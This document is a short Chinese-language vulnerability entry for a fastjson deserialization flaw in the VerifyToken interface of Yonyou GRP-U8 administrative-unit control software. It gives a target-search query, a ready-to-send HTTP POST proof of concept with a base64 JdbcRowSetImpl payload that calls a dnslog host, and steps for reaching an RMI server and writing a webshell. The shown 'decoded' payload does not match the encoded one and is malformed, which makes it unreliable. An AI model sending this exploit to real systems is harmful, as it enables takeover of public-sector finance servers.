app="用友-GRP-U8"

**一、漏洞简述**

用友GRP-U8行政事业内控管理软件是一款专门针对行政事业单位开发的内部控制管理系统，旨在提高内部控制的效率和准确性。该软件具有以下功能特点：基于B/S架构设计，支持多级权限管理，确保数据安全性和系统稳定性；提供全面的内部控制功能，包括预算编制、收支管理、资产管理、合同管理、采购管理等多个模块，满足行政事业单位的全方位需求；支持与用友GRP-U8财务系统无缝对接，实现财务数据与业务数据的统一管理和共享； 可根据用户需求进行定制开发，支持二次开发和系统扩展。其接口VerifyToken存在fastjson反序列化漏洞，攻击者可通过该漏洞执行系统命令从而控制该系统。

**二、漏洞检测poc**

```YAML
POST /VerifyToken HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 254

PARAM=eyJuYW1lIjp7IkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwidmFsIjoiY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGwifSwieCI6eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJkbnM6Ly8yMDUwYTU5MS5kbnNsb2cuYml6IiwiYXV0b0NvbW1pdCI6dHJ1ZX19
```

经过base编码

命令执行搭建rmi服务器写入shell进行访问

```解码后
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://shell.jsp","autoCommit":true}}
```

